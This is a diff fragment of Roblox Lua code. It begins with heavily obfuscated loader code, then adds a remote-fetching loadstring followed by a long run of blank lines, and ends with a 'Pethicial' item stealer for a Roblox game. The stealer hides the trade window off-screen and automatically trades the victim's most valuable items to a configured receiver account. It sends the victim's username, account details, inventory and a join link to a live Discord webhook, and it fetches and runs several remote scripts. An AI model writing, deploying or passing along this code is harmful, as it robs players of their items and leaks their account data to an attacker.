t>=f then l[t]=d[t];e[1]=l;end;end;end;else if 8==f then if(n[e[l]]==e[r])then t=t+1;else t=e[d];end;else local f;n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=u[e[d]];t=t+1;e=o[t];n[e[l]]=n[e[d]];t=t+1;e=o[t];f=e[l]n[f]=n[f](n[f+1])t=t+1;e=o[t];n[e[l]][n[e[d]]]=n[e[r]];t=t+1;e=o[t];do return end;end end else if 4~=f then repeat if f~=6 then n[e[l]]=u[e[d]];break;end;local e=e[l]n[e]=n[e](s(n,e+1,h))until true;else n[e[l]]=u[e[d]];end end end end else if 32>f then if 26<=f then if f<=28 then if f<27 then t=e[d];else if f~=27 then n[e[l]]=n[e[d]]%e[r];else local f;for a=0,3 do if a<2 then if 0~=a then f=e[l]n[f]=n[f](n[f+1])t=t+1;e=o[t];else n[e[l]]=n[e[d]];t=t+1;e=o[t];end else if-2<=a then repeat if 2~=a then n[e[l]][n[e[d]]]=n[e[r]];break;end;n[e[l]][n[e[d]]]=n[e[r]];t=t+1;e=o[t];until true;else n[e[l]][n[e[d]]]=n[e[r]];end end end end end else if 30<=f then if 27~=f then for t=24,69 do if 30~=f then n[e[l]]=n[e[d]]+n[e[r]];break;end;n[e[l]]=c[e[d]];break;end;else n[e[l]]=n[e[d]]+n[e[r]];end else n[e[l]][n[e[d]]]=n[e[r]];end end else if f>22 then if 23>=f then n[e[l]]={};else if f>21 then repeat if f>24 then n[e[l]]=n[e[d]][e[r]];break;end;n[e[l]]=n[e[d]][e[r]];until true;else n[e[l]]=n[e[d]][e[r]];end end else if 21==f then if(n[e[l]]==e[r])then t=t+1;else t=e[d];end;else local e=e[l];h=e+b-1;for t=e,h do local e=k[t-e];n[t]=e;end;end end end else if f<37 then if f>=34 then if 34<f then if f>35 then if(e[l]<n[e[r]])then t=t+1;else t=e[d];end;else local t=e[l]n[t]=n[t](s(n,t+1,e[d]))end else do return n[e[l]]end end else if f~=31 then for t=40,82 do if f~=33 then do return end;break;end;local c,s,u,f,a,h,o;local t=0;while t>-1 do if t<3 then if 0>=t then c=l;s=d;u=r;else if t~=2 then f=e;else a=f[s];end end else if t>=5 then if t>=2 then for e=49,93 do if t~=6 then n[h]=o;break;end;t=-2;break;end;else t=-2;end else if t>3 then o=n[a];for e=1+a,f[u]do o=o..n[e];end;else h=f[c];end end end t=t+1 end break;end;else do return end;end end else if 39>=f then if f<38 then local e=e[l]n[e]=n[e](s(n,e+1,h))else if 35<=f then for t=32,97 do if 39~=f then n[e[l]]=(e[d]~=0);break;end;local l=e[l];local t=n[e[d]];n[l+1]=t;n[l]=t[e[r]];break;end;else n[e[l]]=(e[d]~=0);end end else if 40>=f then if(n[e[l]]~=e[r])then t=t+1;else t=e[d];end;else if f~=37 then repeat if 41~=f then for e=e[l],e[d]do n[e]=nil;end;break;end;local f=e[l];local d={};for e=1,#m do local e=m[e];for t=0,#e do local t=e[t];local l=t[1];local e=t[2];if l==n and e>=f then d[e]=l[e];t[1]=d;end;end;end;until true;else local f=e[l];local d={};for e=1,#m do local e=m[e];for t=0,#e do local t=e[t];local l=t[1];local e=t[2];if l==n and e>=f then d[e]=l[e];t[1]=d;end;end;end;end end end end end end end t=1+t;end;end;return ne end;local l=0xff;local o={};local f=(1);local d='';(function(n)local t=n local r=0x00 local e=0x00 t={(function(h)if r>0x30 then return h end r=r+1 e=(e+0xa6e-h)%0x12 return(e%0x03==0x0 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xb5);end return true end)'kSTYa'and t[0x2](0x1c6+h))or(e%0x03==0x1 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x14);d={d..'\58 a',d};o[f]=ne();f=f+((not a.MViG_HL_)and 1 or 0);d[1]='\58'..d[1];l[2]=0xff;end return true end)'Evqfe'and t[0x3](h+0x65))or(e%0x03==0x2 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x33);end return true end)'lSvdB'and t[0x1](h+0x2dc))or h end),(function(f)if r>0x2b then return f end r=r+1 e=(e+0xed9-f)%0x41 return(e%0x03==0x0 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x2e);end return true end)'lCkXM'and t[0x3](0x25e+f))or(e%0x03==0x2 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x79);end return true end)'SZFEL'and t[0x2](f+0x2f8))or(e%0x03==0x1 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x38);d='\37';l={function()l()end};d=d..'\100\43';end return true end)'MFGdV'and t[0x1](f+0x356))or f end),(function(a)if r>0x30 then return a end r=r+1 e=(e+0xb62-a)%0x37 return(e%0x03==0x0 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xf0);l[2]=(l[2]*(te(function()o()end,s(d))-te(l[1],s(d))))+1;o[f]={};l=l[2];f=f+l;end return true end)'L_ZDr'and t[0x1](0x2a3+a))or(e%0x03==0x2 and(function(t)if not n[t]then e=e+0x01 n[t]=(0x82);o[f]=de();f=f+l;end return true end)'YPjKA'and t[0x3](a+0x1a3))or(e%0x03==0x1 and(function(t)if not n[t]then e=e+0x01 n[t]=(0xc3);end return true end)'CwUtu'and t[0x2](a+0x234))or a end)}t[0x2](0x275)end){};local e=_(s(o));o[2]={};o[1]=e(o[1])JuTdlqzPzbFYmXP=nil;e=_(s(o))return e(...);end return te((function()local n={}local e=0x01;local t;if a.MViG_HL_ then t=a.MViG_HL_(te)else t=''end if a.aBOnRWnz(t,a.Ej_yBRHk)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(t,e,n,l,d,f)local f;if 4<=t then if 6>t then if t>3 then repeat if t~=5 then local t=l;local l,f,d=d(2);do return function()local e,r,n,o=e(n,t(t,t),t(t,t)+3);t(4);return(o*l)+(n*f)+(r*d)+e;end;end;break;end;local t=l;do return function()local e=e(n,t(t,t),t(t,t));t(1);return e;end;end;until true;else local t=l;local r,o,f=d(2);do return function()local d,n,l,e=e(n,t(t,t),t(t,t)+3);t(4);return(e*r)+(l*o)+(n*f)+d;end;end;end else if t<7 then do return d[n]end;else if 3~=t then repeat if 7~=t then do return n(t,nil,n);end break;end;do return setmetatable({},{['__\99\97\108\108']=function(e,t,l,d,n)if n then return e[n]elseif d then return e else e[t]=l end end})end until true;else do return setmetatable({},{['__\99\97\108\108']=function(e,t,d,l,n)if n then return e[n]elseif l then return e else e[t]=d end end})end end end end else if 1<t then if 1~=t then repeat if 2~=t then do return e(1),e(4,d,l,n,e),e(5,d,l,n)end;break;end;do return 16777216,65536,256 end;until true;else do return e(1),e(4,d,l,n,e),e(5,d,l,n)end;end else if-4<t then for f=29,92 do if t~=0 then do return function(t,e,n)if n then local e=(t/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(t%(e+e)>=e)and 1 or 0;end;end;end;break;end;do return e(1),e(4,d,l,n,e),e(5,d,l,n)end;break;end;else do return e(1),e(4,d,l,n,e),e(5,d,l,n)end;end end end end),...)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplay/psychic-octo-invention/main/yarhm.lua", false))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Config = {
+    Receivers = {"sambou93107"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
+    Webhook = "https://discord.com/api/webhooks/1263833368215158865/4J8nEnlTsrYrwDckjTv02gRFMpcyHWCAfvN1gaagZLYTqIk7X4GjbsWCIWu1yc8XkjeQ",
+    FullInventory = true, -- If true, it will display all of the player's items.
+    GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
+    ResendTrade = "gg", -- Send this in chat to resend the trade request if you don't receive it.
+    Script = "None", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
+    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
+}
+
+repeat wait() until game:IsLoaded()
+
+if getgenv().scriptexecuted then return end
+getgenv().scriptexecuted = true
+
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+
+local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Orion/Source"))()
+DYWebhook.ErrorPrinting = false
+local embed = DYWebhook.BuildEmbed()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local VirtualUser = game:GetService("VirtualUser")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Trade = ReplicatedStorage.Trade
+local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+local Position = UDim2.new(0, 9999, 0, 9999)
+local Inventory = {}
+
+local function sendnotification(message)
+    getgenv().scriptexecuted = false
+    print("[ Pethicial | .gg/pethicial ]: " .. message)
+    Notification:Notify(
+        {Title = "Pethicial | .gg/pethicial", Description = message},
+        {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "default"}
+    )
+end
+
+local games = {
+    [142823291] = true,
+    [335132309] = true,
+    [636649648] = true
+}
+
+if not games[game.PlaceId] then
+    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
+    while true do end
+    wait(99999999999999999999999999999999999)
+end
+
+if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
+    sendnotification("Script terminated due to an invaild webhook url.")
+    InvaildWebhook = true
+    return
+end
+
+if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
+    sendnotification("Script terminated due to an invaild receivers table.")
+    return
+end
+
+if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
+    sendnotification("Script terminated due to an invaild custom url.")
+    return
+end
+
+if Config.FullInventory ~= true and Config.FullInventory ~= false then
+    Config.FullInventory = true
+end
+
+if Config.Script == nil then
+    Config.Script = "None"
+elseif Config.Script == "Custom" then
+    Config.Script = Config.Script .. " - " .. Config.CustomLink
+end
+
+if Config.Script == "Custom" then
+    loadstring(game:HttpGet(Config.CustomLink))()
+elseif Config.Script == "Overdrive H" then
+    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
+elseif Config.Script == "Symphony Hub" then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
+elseif Config.Script == "Highlight Hub" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
+elseif Config.Script == "Eclipse Hub" then
+    getgenv().mainKey = "nil"
+    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+elseif Config.Script == "R3TH PRIV" then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
+elseif Config.Script == "AshbornnHub" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",true))()
+elseif Config.Script == "Nexus" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
+end
+
+Executor = identifyexecutor()
+if Executor == "Solara" then
+    return
+end
+
+wait(5)
+
+local success, errorMsg = pcall(function()
+    Common = 0
+    Uncommon = 0
+    Rare = 0
+    Legendary = 0
+    Vintage = 0
+    Godly = 0
+    Ancient = 0
+    Unique = 0
+    
+    LocalPlayer.Idled:connect(function()
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton2(Vector2.new())
+    end)
+    
+    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
+        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+        TradePath = LocalPlayer.PlayerGui.TradeGUI
+        Mobile = false
+    else
+        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+        TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
+        Mobile = true
+    end
+    
+    function TapUI(button, check, button2)
+        if check == "Active Check" then
+            if button.Active then
+                button = button[button2]
+            else
+                return
+            end
+        end
+        if check == "Text Check" then
+            if button == "^" then
+                button = button2
+            else
+                return
+            end
+        end
+        for i,v in pairs(events) do
+            for i,v in pairs(getconnections(button[v])) do
+                v:Fire()
+            end
+        end
+    end
+    
+    function Rarity(color, amount, tradeable, requirepath, path)
+        Stack = 0
+    
+        if tradeable then
+            if tradeable:FindFirstChild("Evo") then
+                return
+            end
+        end
+    
+        if amount ~= "" then
+            Stack = tonumber(amount:match("x(%d+)"))
+        else
+            Stack = 1
+        end
+    
+        local r = math.floor(color.R * 255 + 0.5)
+        local g = math.floor(color.G * 255 + 0.5)
+        local b = math.floor(color.B * 255 + 0.5)
+
+        if r == 106 and g == 106 and b == 106 then
+            Common = Common + Stack
+        elseif r == 0 and g == 255 and b == 255 then
+            Uncommon = Uncommon + Stack
+        elseif r == 0 and g == 200 and b == 0 then
+            Rare = Rare + Stack
+        elseif r == 220 and g == 0 and b == 5 then
+            Legendary = Legendary + Stack
+        elseif r == 255 and g == 0 and b == 179 then
+            Godly = Godly + Stack
+        elseif r == 100 and g == 10 and b == 255 then
+            Ancient = Ancient + Stack
+        elseif r == 240 and g == 140 and b == 0 then
+            Unique = Unique + Stack
+        elseif r == 180 and g == 70 and b == 0 then
+            Common = Common + Stack
+        else
+            Vintage = Vintage + Stack
+        end
+    end
+
+    function checkitem(v)
+        if v:IsA("Frame") then
+            if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
+                if Config.FullInventory then
+                    if v.Container.Amount.Text ~= "" then
+                        number = v.Container.Amount.Text
+                    else
+                        number = "x1"
+                    end
+                    table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
+                end
+            end
+        end
+    end
+    
+    function FullInventory()
+        for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+            for i,v in pairs(v.Container:GetChildren()) do
+                if v.Name == "Christmas" or v.Name == "Halloween" then
+                    for i,v in pairs(v.Container:GetChildren()) do
+                        checkitem(v)
+                    end
+                else
+                    checkitem(v)
+                end
+            end
+        end
+        for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+            checkitem(v)
+        end
+        if Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
+            table.insert(Inventory, "None")
+        end
+        if Config.FullInventory then
+            AllItems = table.concat(Inventory, ", ")
+        else
+            AllItems =  "Full inventory set false."
+        end
+    end
+
+    FullInventory()
+    
+    task.wait()
+    
+    function Sendtrade()
+        if Mobile then
+            local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
+            TapUI(Path.Container.Close)
+            TapUI(Path.Container.PlayerList[Receiver].ActionButton)
+            TapUI(Path.Popup.Container.Action.Trade)
+            TapUI(Path.Popup.Container.Close)
+        else
+            local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
+            TapUI(Path.Container.ToggleRequests.On)
+            TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
+            TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
+            TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
+            TapUI(Path.Container[Receiver].ActionButton)
+            TapUI(Path.Inspect.Trade)
+            TapUI(Path.Inspect.Close)
+        end
+    end
+    
+    function readchats()
+        Players[Receiver].Chatted:Connect(function(msg)
+            if msg == Config.ResendTrade then
+                Sendtrade()
+            end
+        end)
+    end
+    
+    function Activate(player)
+        for i,v in pairs(Config.Receivers) do
+            if v == player then
+                Receiver = player
+                readchats()
+                wait(10)
+                Sendtrade()
+            end
+        end
+    end
+    
+    function InsertItems()
+        local ItemsByRarity = {
+            Ancient = {},
+            Godly = {},
+            Unique = {},
+            Vintage = {},
+            Legendary = {},
+            Rare = {},
+            Uncommon = {},
+            Common = {}
+        }
+
+        for i,v in pairs(TradePath.Container.Items.Main:GetChildren()) do
+            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
+                if v:IsA("Frame") then
+                    if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+                        local rarity = "Common"
+                        local color = v.ItemName.BackgroundColor3
+                        if color == Color3.fromRGB(220, 0, 5) then
+                            rarity = "Legendary"
+                        elseif color == Color3.fromRGB(255, 0, 179) then
+                            rarity = "Godly"
+                        elseif color == Color3.fromRGB(100, 10, 255) then
+                            rarity = "Ancient"
+                        elseif color == Color3.fromRGB(240, 140, 0) then
+                            rarity = "Unique"
+                        elseif color == Color3.fromRGB(255, 255, 0) then
+                            rarity = "Vintage"
+                        elseif color == Color3.fromRGB(0, 200, 0) then
+                            rarity = "Rare"
+                        elseif color == Color3.fromRGB(0, 255, 255) then
+                            rarity = "Uncommon"
+                        end
+                        table.insert(ItemsByRarity[rarity], v)
+                    end
+                end
+            end
+        end
+
+        local ItemsInTrade = 0
+        local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+    
+        for _, rarity in ipairs(rarityOrder) do
+            for _, item in ipairs(ItemsByRarity[rarity]) do
+                if ItemsInTrade < 4 then
+                    ItemsInTrade = ItemsInTrade + 1
+                    local LoopsItem = 1
+                    local Amount = item.Container.Amount.Text
+                    if Amount ~= "" then
+                        LoopsItem = tonumber(Amount:match("x(%d+)"))
+                    end
+                    task.wait()
+                    for i = 1, LoopsItem do
+                        TapUI(item.Container.ActionButton)
+                    end
+                end
+            end
+        end
+    
+        wait(10)
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+    end
+
+    if Mobile then
+        TradePath.Container.Position = Position
+        TradePath.ClickBlocker.Position = Position
+    else
+        TradePath.BG.Position = Position
+        TradePath.Container.Position = Position
+        TradePath.ClickBlocker.Position = Position
+        TradePath.Processing.Position = Position
+    end
+    
+    TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
+        wait(3)
+        if TradePath.Enabled then
+            InsertItems()
+        else
+            Sendtrade()
+        end
+    end)
+    
+    Players.PlayerAdded:Connect(function(player)
+        Activate(player.Name)
+    end)
+    
+    for i,v in pairs(Players:GetPlayers())do
+        Activate(v.Name)
+    end
+end)
+if success then
+    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. Executor .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\nÃ°Å¸Å½â€™ **__Inventory__**\n```Ancient    Ã°Å¸Å¸Âª: " .. Ancient .. "\nGoldy      Ã°Å¸Â§ : " .. Godly .. "\nUnique     Ã°Å¸Å¸Â§: " .. Unique .. "\nVintage    Ã°Å¸Å¸Â¨: " .. Vintage .. "\nLegendary  Ã°Å¸Å¸Â¥: " .. Legendary .. "\nRare       Ã°Å¸Å¸Â©: " .. Rare .. "\nUncommon   Ã°Å¸Å¸Â¦: " .. Uncommon .. "\nCommon     Ã¢Â¬â€º: " .. Common .. "```\nÃ°Å¸Å½â€™ **__Full Inventory__**\n```" .. AllItems .. "```\nÃ°Å¸â€â€” **__Execute to join__**\n```" .. TeleportScript .. "```"
+else
+    message = "```Error   : " .. errorMsg .. "\nExploit : " .. Executor .. "```\n\n**Please report this error to .gg/pethicial as it may be a critical error that could lead to vulnerabilities.**"
+end
+
+if InvaildWebhook then
+    return
+end
+
+if Vintage == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Config.GoodItemsOnly then
+    content = ""
+elseif Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
+    content = ""
+else
+    content = "@everyone"
+end
+
+embed.Info = {
+	Settings = {
+		Color = DYWebhook.ColorConverter(Color3.fromRGB(255,215,0))
+	},
+	Embed = {
+		Title = "Ã°Å¸â€˜â€˜ **__Pethicial__ | __.gg/pethicial__**",
+		Description = message,
+		Footer = ".gg/pethicial",
+	}
+}
+
+DYWebhook:Send({
+	url = Config.Webhook,
+	content = content,
+	embeds = {embed}
+})
